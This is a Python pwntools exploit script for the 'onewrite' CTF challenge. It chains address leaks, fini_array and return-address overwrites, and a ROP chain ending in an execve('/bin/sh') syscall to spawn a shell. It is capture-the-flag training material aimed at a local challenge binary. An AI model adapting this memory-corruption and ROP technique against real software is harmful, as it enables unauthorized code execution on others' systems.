# This exploit is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-01-19-Insomni-Hack-Teaser/README.md#onewrite

from pwn import *


target = process('./onewrite')
elf = ELF('onewrite')
# gdb.attach(target, gdbscript='pie b *0x106f3')
gdb.attach(target,api=True)
# Establish helper functions
def leak(opt):
    target.recvuntil('>')
    target.sendline(str(opt))
    leak = target.recvline()
    leak = int(leak, 16)
    return leak

def write(adr, val, other = 0):
    target.recvuntil('address :')
    target.send(str(adr))
    target.recvuntil('data :')
    if other == 0:
        target.send(p64(val))
    else:
        target.send(val)

    

# First leak the Stack address, and calculate where the return address will be in do_overwrite
stackLeak = leak(1)
log.info(f"stack leak: {hex(stackLeak)}")
ripAdr = stackLeak + 0x18

# Calculate where the return address for __libc_csu_fini
csiRipAdr = stackLeak - 72
log.info(f"cai qq gi do: {hex(csiRipAdr)}")
# Write over the return address in do_overwrite with do_leak
write(ripAdr, p8(0x04), 1)


# Leak the PIE address of do leak
doLeakAdr = leak(2)
log.info(f"do_leak addr: {hex(doLeakAdr)}")
# Calculate the base of PIE  
pieBase = doLeakAdr - elf.symbols['do_leak']

# Calculate the address of the _fini_arr table, and the __libc_csu_fini function using the PIE base
finiArrAdr = pieBase + elf.symbols['__do_global_dtors_aux_fini_array_entry']
__libc_csu_fini = pieBase + elf.symbols["__libc_csu_fini"]
log.info(f"fini_array addr: {hex(finiArrAdr)}")
log.info(f"__libc_csu_fini addr: {hex(__libc_csu_fini)}")

# Calculate the position of do_overwrite
doOverwrite = pieBase + elf.symbols['do_overwrite']

# Write over return address in do_overwrite with do_overwrite
write(ripAdr, p8(0x04), 1)
leak(1)

# Write over the two entries in _fini_arr table with do_overwrite, and restart the loop
write(finiArrAdr + 8, doOverwrite)
write(finiArrAdr, doOverwrite)
log.info(f"csiRipAdr: {hex(csiRipAdr)}")
write(csiRipAdr, __libc_csu_fini)

# Increment stack address of saved rip for __libc_csu_fini due to new iteration of loop
csiRipAdr += 8

# Establish rop gagdets, and "/bin/sh" address
popRdi = pieBase + 0x84fa
popRsi = pieBase + 0xd9f2
popRdx = pieBase + 0x484c5
popRax = pieBase + 0x460ac
syscall = pieBase + 0x917c
binshAdr = doLeakAdr + 0x2aa99b

# 0x00000000000106f3 : add rsp, 0xd0 ; pop rbx ; ret
pivotGadget = pieBase + 0x106f3

# Function which we will use to write Qwords using loop
def writeQword(adr, val):
    global csiRipAdr
    write(adr, val)
    log.info(f"csiRipAdr: {hex(csiRipAdr)}")
    write(csiRipAdr, __libc_csu_fini)
    csiRipAdr += 8

# first wite "/bin/sh" to the designated place in memory
writeQword(binshAdr, u64("/bin/sh\x00"))

'''
Our ROP Chain will do this:
pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
'''

# write the ROP chain

log.info("pop rdi")
writeQword(stackLeak + 0xd0, popRdi)
writeQword(stackLeak + 0xd8, binshAdr)
log.info("pop rsi")
writeQword(stackLeak + 0xe0, popRsi)
writeQword(stackLeak + 0xe8, 0)
log.info("pop rdx")
writeQword(stackLeak + 0xf0, popRdx)
writeQword(stackLeak + 0xf8, 0)
log.info("pop rax")
writeQword(stackLeak + 0x100, popRax)
writeQword(stackLeak + 0x108, 59)
log.info("syscall")
writeQword(stackLeak + 0x110, syscall)


# write the ROP pivot gadget to the return address of do_overwrite, which will trigger the rop chain
write(stackLeak - 0x10, pivotGadget)

# drop to an interactive shell
target.interactive()
